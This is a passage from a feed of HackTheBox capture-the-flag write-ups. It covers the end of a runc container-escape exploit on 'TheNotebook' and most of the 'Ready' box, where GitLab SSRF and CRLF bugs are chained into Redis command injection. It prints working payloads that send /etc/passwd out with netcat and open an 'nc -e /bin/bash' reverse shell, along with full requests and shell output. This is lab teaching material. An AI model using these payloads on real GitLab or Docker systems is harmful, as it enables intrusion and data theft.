<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 bash
</span></span><span class="line"><span class="cl">root@0f4c2517af40:/opt/webapp# wget -q 10.10.14.17:8080/breakout <span class="o">&amp;&amp;</span> chmod +x breakout
</span></span><span class="line"><span class="cl">root@0f4c2517af40:/opt/webapp# ./breakout
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
</span></span></code></pre></div><p>Then on the second session, I will run the sudo command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">noah@thenotebook:~$ sudo /usr/bin/docker <span class="nb">exec</span> -it webapp-dev01 /bin/sh
</span></span></code></pre></div><p>But then, on the container session, I get the following error:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@0f4c2517af40:/opt/webapp# ./breakout
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">17638</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: self
</span></span><span class="line"><span class="cl">strconv.Atoi: parsing <span class="s2">&#34;self&#34;</span>: invalid syntax
</span></span></code></pre></div><p>To resolve that, at line 42 of the <code>main.go</code> file, I will add another condition to ignore PID with name &ldquo;self&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">f</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">pids</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fbytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">ioutil</span><span class="p">.</span><span class="nf">ReadFile</span><span class="p">(</span><span class="s">&#34;/proc/&#34;</span> <span class="o">+</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">()</span> <span class="o">+</span> <span class="s">&#34;/cmdline&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="nx">fstring</span> <span class="o">:=</span> <span class="nb">string</span><span class="p">(</span><span class="nx">fbytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">fstring</span><span class="p">,</span> <span class="s">&#34;runc&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">!</span><span class="nx">strings</span><span class="p">.</span><span class="nf">Contains</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">(),</span> <span class="s">&#34;self&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// Added by me
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;[+] Found the PID:&#34;</span><span class="p">,</span> <span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">			<span class="nx">found</span><span class="p">,</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">Atoi</span><span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nf">Name</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">				<span class="k">return</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="c1">// end
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>I will re-compile the exploit and transfer it again to the container, and this time it works!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">root@c8cf4072ca26:/opt/webapp# ./breakout 
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Overwritten /bin/sh successfully
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Found the PID: <span class="m">1729</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Getting file handle
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully got the file handle
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Successfully got write handle <span class="p">&amp;</span><span class="o">{</span>0xc000444000<span class="o">}</span>
</span></span><span class="line"><span class="cl">root@c8cf4072ca26:/opt/webapp# 
</span></span></code></pre></div><p>The full process</p>
<p><div class="img-container"><img src="imgs/image-20210807220201808.png" alt="image-20210807220201808"  /></div>
</p>
<h4 id="ssh---root">SSH - Root</h4>
<p>Now I can SSH login as root using my own private key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «thenotebook» «10.10.14.17»  
</span></span><span class="line"><span class="cl">$ ssh root@10.10.10.230
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-151-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  System load:  0.1               Processes:              <span class="m">190</span>
</span></span><span class="line"><span class="cl">  Usage of /:   46.1% of 7.81GB   Users logged in:        <span class="m">1</span>
</span></span><span class="line"><span class="cl">  Memory usage: 19%               IP address <span class="k">for</span> ens160:  10.10.10.230
</span></span><span class="line"><span class="cl">  Swap usage:   0%                IP address <span class="k">for</span> docker0: 172.17.0.1
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Fri Jul <span class="m">23</span> 14:27:18 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">root@thenotebook:~# 
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Ready</title>
      <link>https://fahmifj.github.io/hackthebox/ready/</link>
      <pubDate>Sat, 15 May 2021 22:00:39 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/ready/</guid>
      <description>Turns SSRF to remote code execution and escape from a Docker container</description>
      <content:encoded><![CDATA[<p>Ready from HackTheBox features a GitLab instance in a Docker container. Chaining two GitLab CVEs (CVE-2018-19571 &amp; CVE-2018-19585) allows me to gain a foothold on the container. Enumerating the container discovers a password that can be used on the container&rsquo;s root account. Since the container running in privileged mode, it is possible to mount the host file system into the container.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>GitLab 11.4.7 exploitation</li>
<li>Chaining bugs from CVE-2018-19571 and CVE-2018-19585</li>
<li>Docker security</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>BurpSuite - Preinstalled in Kali Linux</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>All ports scan with <code>nmap</code> discovers two open ports: SSH on port 22, and a HTTP web server on port 5080</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ready» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ nmap -p- -sV --reason -oA nmap/10-initial-ready <span class="s1">&#39;10.10.10.220&#39;</span>
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-14 04:53 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.220
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.18s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed ports
</span></span><span class="line"><span class="cl">Reason: <span class="m">65533</span> resets
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">5080/tcp open  http    syn-ack ttl <span class="m">62</span> nginx
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 503.44 seconds
</span></span></code></pre></div><p>After performing a default script scan shows there&rsquo;s a GitLab instance on port 5080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «ready» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ nmap -p22,5080 -sC -sV --reason -oA nmap/10-default-ready 10.10.10.220
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-14 05:17 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.220
</span></span><span class="line"><span class="cl">Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.090s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 8.2p1 Ubuntu <span class="m">4</span> <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">5080/tcp open  http    syn-ack ttl <span class="m">62</span> nginx
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">53</span> disallowed entries <span class="o">(</span><span class="m">15</span> shown<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> / /autocomplete/users /search /api /admin /profile 
</span></span><span class="line"><span class="cl"><span class="p">|</span> /dashboard /projects/new /groups/new /groups/*/edit /users /help 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_/s/ /snippets/new /snippets/*/edit
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Sign in <span class="se">\x</span>C2<span class="se">\x</span>B7 GitLab
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was http://10.10.10.220:5080/users/sign_in
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-trane-info: Problem with XML parsing of /evox/about
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.70 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5080---gitlab">TCP 5080 - GitLab</h3>
<p>The page displays a self-hosted GitLab Community Edition.</p>
<p><div class="img-container"><img src="imgs/image-20210514162031899.png" alt="image-20210514162031899"  /></div>
</p>
<p>I can register with any email domain.</p>
<p><div class="img-container"><img src="imgs/image-20210514162151369.png" alt="image-20210514162151369"  /></div>
</p>
<p>The GitLab version can be seen by visiting<code>/help</code>, and it seems to be an outdated one.</p>
<p><div class="img-container"><img src="imgs/image-20210514162920343.png" alt="image-20210514162920343"  /></div>
</p>
<p>I&rsquo;ll take a note on the version.</p>
<h4 id="user-enumeration-via-gitlab-api">User Enumeration via GitLab API</h4>
<p>I can enumerate the GitLab users via <code>/api/v4/users</code>, but in the end, this was not used.</p>
<p><div class="img-container"><img src="imgs/image-20210514162754664.png" alt="image-20210514162754664"  /></div>
</p>
<p>I&rsquo;ll move and search for vulnerabilities.</p>
<h4 id="searchsploit">Searchsploit</h4>
<p>I can feed the GitLab version to <code>searchsploit</code>, and it returns with two exploits that match with the version.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ searchsploit GitLab 11.4.7    
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                            <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                   <span class="p">|</span> ruby/webapps/49334.py
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                 <span class="p">|</span> ruby/webapps/49257.py
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>I relaxed the keyword to find other potential exploits, and I found an arbitrary file read which previously was used to exploit <a href="/writeup/hackthebox/htb-laboratory">Laboratory</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.20»
</span></span><span class="line"><span class="cl">$ searchsploit GitLab
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                            <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                       <span class="p">|</span> ruby/webapps/40236.txt
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                   <span class="p">|</span> ruby/webapps/49334.py
</span></span><span class="line"><span class="cl">GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                 <span class="p">|</span> ruby/webapps/49257.py
</span></span><span class="line"><span class="cl">GitLab 12.9.0 - Arbitrary File Read                                       <span class="p">|</span> ruby/webapps/48431.txt
</span></span><span class="line"><span class="cl">Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                       <span class="p">|</span> ruby/webapps/49076.py
</span></span><span class="line"><span class="cl">Gitlab 6.0 - Persistent Cross-Site Scripting                              <span class="p">|</span> php/webapps/30329.sh
</span></span><span class="line"><span class="cl">Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                <span class="p">|</span> linux/remote/34362.rb
</span></span><span class="line"><span class="cl">Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting         <span class="p">|</span> java/webapps/47927.txt
</span></span><span class="line"><span class="cl">NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution           <span class="p">|</span> json/webapps/47420.txt
</span></span><span class="line"><span class="cl">-------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-1147-rce-cve-2018-19571--cve-2018-19585---poc">GitLab 11.4.7 RCE (CVE-2018-19571 &amp; CVE-2018-19585) - PoC</h4>
<p>The RCE exploit that was popped on <code>searchsploit</code> above is consist of two vulnerabilities, SSRF (CVE-2018-19571) and CRLF Injection (CVE-2018-19585). The exploit&rsquo;s author uses the <a href="https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/">LifeOverFlow</a>&rsquo;s blog post as reference. So I decided to read that blog and try to reproduce it here.</p>
<p>With SSRF, you can talk with the internal Redis server on port 6379 that used by GitLab as database, cache and message broker. If there is an HTTP request sent to the Redis server using SSRF, the request would read as follows (<code># ==&gt;</code>  is a comment by me)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">GET blablabla HTTP/1.1 # ==&gt; Redis read this as a command 
</span></span></span><span class="line"><span class="cl"><span class="err">Host: [0:0:0:0:0:ffff:127.0.0.1]:6379 
</span></span></span><span class="line"><span class="cl"><span class="err">User-Agent: git/2.18.1  
</span></span></span><span class="line"><span class="cl"><span class="err">Accept: */* 
</span></span></span><span class="line"><span class="cl"><span class="err">Accept-Encoding: deflate, gzip 
</span></span></span><span class="line"><span class="cl"><span class="err">Pragma: no-cache 
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">- Err wrong number of arguments for &#39;get&#39; command 
</span></span></span></code></pre></div><p>The idea here is to leverage the Import project feature from GitLab to talk to Redis server, and insert a payload in the URL using CRLF injection.</p>
<p>On GitLab, I’ll import a (non-exist) project and choose the &ldquo;Repo by URL&rdquo; menu.</p>
<p><div class="img-container"><img src="imgs/image-20210514171125509.png" alt="image-20210514171125509"  /></div>
</p>
<p>I&rsquo;ll be using the same SSRF payload to bypass the GitLab URL filter which is <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/</code> and add my (non-exist) <code>.git</code> repository at the end of the URL, so it becomes <code>git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/ssrf-test.git</code></p>
<p><div class="img-container"><img src="imgs/image-20210515000620634.png" alt="image-20210515000620634"  /></div>
</p>
<blockquote>
<p>The repository URL above is a <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">special IPv6 address</a> where its last 32 bits is used to embed the IPv4 address. The URL was used to bypass the SSRF protection defined in <code>spec/lib/gitlab/url_blocker_spec.rb</code></p>
</blockquote>
<p>I&rsquo;ll intercept the request after I hit the “Create Project” button, and then on Burp Suite, I’ll replace the import URL with the following:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
</span></span><span class="line"><span class="cl"> multi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> sadd resque:gitlab:queues system_hook_push
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> exec
</span></span><span class="line"><span class="cl"> exec
</span></span><span class="line"><span class="cl">/ssrf-test.git
</span></span></code></pre></div><p>So the full request now looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/projects</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.10.220:5080</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.10.220:5080/projects/new</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">778</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">sidebar_collapsed=false; _gitlab_session=4426e39af6c1d3d4a4484a8a53f0bac9; event_filter=all</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">utf8=%E2%9C%93&amp;authenticity_token=cbS9UXXZDmvTgBUhOTMxF%2FOSii%2FgetcSbM%2FNTT2dG6NllhoQsV8uvbDU65arU9dEOumftKI48ZaDBi6rnJbjOQ%3D%3D&amp;project%5Bimport_url%5D= git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
</span></span><span class="line"><span class="cl"> multi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> sadd resque:gitlab:queues system_hook_push
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|cat /etc/passwd | nc 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> exec
</span></span><span class="line"><span class="cl"> exec
</span></span><span class="line"><span class="cl">/ssrf-test.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=SSRF+test&amp;project%5Bnamespace_id%5D=5&amp;project%5Bpath%5D=ssrf-test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0
</span></span></code></pre></div><p>When I hit the send button, my listener obtains the file contents of <code>/etc/passwd</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> root@kali «exploit» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.20<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.220<span class="o">]</span> <span class="m">36612</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">git:x:998:998::/var/opt/gitlab:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
</span></span><span class="line"><span class="cl">gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
</span></span><span class="line"><span class="cl">gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
</span></span><span class="line"><span class="cl">mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
</span></span><span class="line"><span class="cl">registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
</span></span><span class="line"><span class="cl">gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
</span></span><span class="line"><span class="cl">dude:x:1000:1000::/home/dude:/bin/bash
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210515002210570.png" alt="image-20210515002210570"  /></div>
</p>
<h4 id="weaponize---reverse-shell">Weaponize - Reverse Shell</h4>
<p>From here, I’ll reproduce the step above, but this time I’ll send myself a shell. The payload as follows.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"> git://[0:0:0:0:0:ffff:127.0.0.1]:6379/iamf/
</span></span><span class="line"><span class="cl"> multi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> sadd resque:gitlab:queues system_hook_push
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> lpush resque:gitlab:queue:system_hook_push &#34;{\&#34;class\&#34;:\&#34;GitlabShellWorker\&#34;,\&#34;args\&#34;:[\&#34;class_eval\&#34;,\&#34;open(\&#39;|nc -e /bin/bash 10.10.14.20 9000\&#39;).read\&#34;],\&#34;retry\&#34;:3,\&#34;queue\&#34;:\&#34;system_hook_push\&#34;,\&#34;jid\&#34;:\&#34;ad52abc5641173e217eb2e52\&#34;,\&#34;created_at\&#34;:1513714403.8122594,\&#34;enqueued_at\&#34;:1513714403.8129568}&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> exec
</span></span><span class="line"><span class="cl"> exec
</span></span><span class="line"><span class="cl">/ssrf-to-rce.git
</span></span></code></pre></div><p>On my <code>nc</code> listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.20<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.220<span class="o">]</span> <span class="m">37306</span>
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>998<span class="o">(</span>git<span class="o">)</span>
</span></span><span class="line"><span class="cl">hostname
</span></span><span class="line"><span class="cl">gitlab.example.com
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>   
</span></span><span class="line"><span class="cl">/var/opt/gitlab/gitlab-rails/working
</span></span></code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I&rsquo;ll do the &lsquo;stty&rsquo; trick to <a href="https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1">upgrade my shell</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">which python3
</span></span><span class="line"><span class="cl">/opt/gitlab/embedded/bin/python3
</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class="line"><span class="cl">git@gitlab:~/gitlab-rails/working$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  + <span class="m">2354</span> suspended  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">→ root@kali «exploit» «10.10.14.20» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span>  - <span class="m">2354</span> continued  nc -nvlp <span class="m">9000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">git@gitlab:~/gitlab-rails/working$ 
</span></span><span class="line"><span class="cl">git@gitlab:~/gitlab-rails/working$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span></code></pre></div><p>On <code>/home</code>, there is only one user called <code>dude</code>, and I&rsquo;m able to read the user flag there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git@gitlab:/home/dude$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">24</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> dude dude <span class="m">4096</span> Dec  <span class="m">7</span> 16:58 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">1</span> root root <span class="m">4096</span> Dec  <span class="m">2</span> 10:45 ..
